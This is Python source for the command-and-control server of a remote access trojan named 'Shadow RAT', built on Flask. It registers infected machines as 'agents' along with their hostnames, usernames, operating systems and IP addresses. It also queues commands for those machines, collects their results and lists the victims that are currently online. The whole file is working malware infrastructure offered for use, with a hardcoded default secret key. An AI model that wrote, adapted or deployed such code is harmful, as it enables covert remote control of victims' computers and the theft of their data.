#!/usr/bin/env python3
"""
Shadow RAT — C2 Server (Flask)
Persistent storage via JSON file (survives Render restarts)
"""
import os, json, threading
from datetime import datetime, timezone
from flask import Flask, request, jsonify

app = Flask(__name__)

SECRET_KEY  = os.environ.get("C2_SECRET_KEY", "Youssef123")
DATA_FILE   = os.environ.get("DATA_FILE", "/tmp/shadow_data.json")
_lock       = threading.Lock()

# ══════════════════════════════════════════════════════════════
#  PERSISTENT STORE
# ══════════════════════════════════════════════════════════════
def load_data():
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, "r") as f:
                d = json.load(f)
                return d.get("agents", {}), d.get("tasks", {}), d.get("counter", [0])
    except: pass
    return {}, {}, [0]

def save_data(agents, tasks, counter):
    try:
        with open(DATA_FILE, "w") as f:
            json.dump({"agents": agents, "tasks": tasks, "counter": counter}, f)
    except: pass

# تحميل البيانات عند البدء
agents, tasks, _task_counter = load_data()

def now_iso():
    return datetime.now(timezone.utc).isoformat()

def new_task_id():
    _task_counter[0] += 1
    save_data(agents, tasks, _task_counter)
    return f"task_{_task_counter[0]:06d}"

def check_auth(body):
    key = body.get("key") or request.headers.get("x-shadow-key", "")
    return key == SECRET_KEY

# ══════════════════════════════════════════════════════════════
#  ROUTES
# ══════════════════════════════════════════════════════════════
@app.route("/functions/c2Server", methods=["POST", "GET"])
def c2():
    body  = request.get_json(silent=True) or {}
    route = request.args.get("route") or body.get("route", "")

    if not check_auth(body):
        return jsonify({"error": "Unauthorized"}), 401

    with _lock:

        # ── checkin ──────────────────────────────────────────
        if route == "checkin":
            agent_id = body.get("agent_id")
            if not agent_id:
                return jsonify({"error": "missing agent_id"}), 400

            agents[agent_id] = {
                "agent_id":  agent_id,
                "hostname":  body.get("hostname", "?"),
                "username":  body.get("username", "?"),
                "os":        body.get("os", "?"),
                "arch":      body.get("arch", "?"),
                "ip":        body.get("ip", "?"),
                "last_seen": now_iso(),
                "status":    "online",
                "extra":     body.get("extra", ""),
            }
            save_data(agents, tasks, _task_counter)

            # pending task?
            for tid, task in list(tasks.items()):
                if task["agent_id"] == agent_id and task["status"] == "pending":
                    tasks[tid]["status"] = "sent"
                    save_data(agents, tasks, _task_counter)
                    return jsonify({
                        "task_id": tid,
                        "action":  task["action"],
                        "args":    task.get("args", {}),
                    })

            return jsonify({"task_id": None})

        # ── result ───────────────────────────────────────────
        if route == "result":
            task_id = body.get("task_id")
            if not task_id or task_id not in tasks:
                return jsonify({"error": "not found"}), 404
            tasks[task_id]["result"] = body.get("result", "")
            tasks[task_id]["status"] = body.get("status", "done")
            save_data(agents, tasks, _task_counter)
            return jsonify({"ok": True})

        # ── agents list ──────────────────────────────────────
        if route == "agents":
            now_ts = datetime.now(timezone.utc).timestamp()
            result = []
            for a in agents.values():
                try:
                    ls = datetime.fromisoformat(a["last_seen"]).timestamp()
                    a["status"] = "online" if now_ts - ls <= 30 else "offline"
                except: pass
                result.append(a)
            # نرجع فقط الـ online
            online = [a for a in result if a["status"] == "online"]
            return jsonify({"agents": online, "total": len(result)})

        # ── issue task ───────────────────────────────────────
        if route == "task":
            agent_id = body.get("agent_id")
            action   = body.get("action")
            if not agent_id or not action:
                return jsonify({"error": "missing fields"}), 400
            tid = new_task_id()
            tasks[tid] = {
                "id":        tid,
                "agent_id":  agent_id,
                "action":    action,
                "args":      body.get("args", {}),
                "status":    "pending",
                "issued_at": now_iso(),
                "result":    "",
            }
            save_data(agents, tasks, _task_counter)
            return jsonify({"task_id": tid})

        # ── get result ───────────────────────────────────────
        if route == "get_result":
            task_id = body.get("task_id")
            if not task_id or task_id not in tasks:
                return jsonify({"error": "not found"}), 404
            return jsonify(tasks[task_id])

        # ── delete agent ─────────────────────────────────────
        if route == "delete_agent":
            agent_id = body.get("agent_id")
            if agent_id and agent_id in agents:
                del agents[agent_id]
                save_data(agents, tasks, _task_counter)
            return jsonify({"ok": True})

    return jsonify({"error": "unknown route"}), 404


@app.route("/", methods=["GET"])
def health():
    with _lock:
        online = sum(1 for a in agents.values() if a.get("status") == "online")
    return jsonify({"status": "Shadow C2 online", "agents": online, "tasks": len(tasks)})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False)
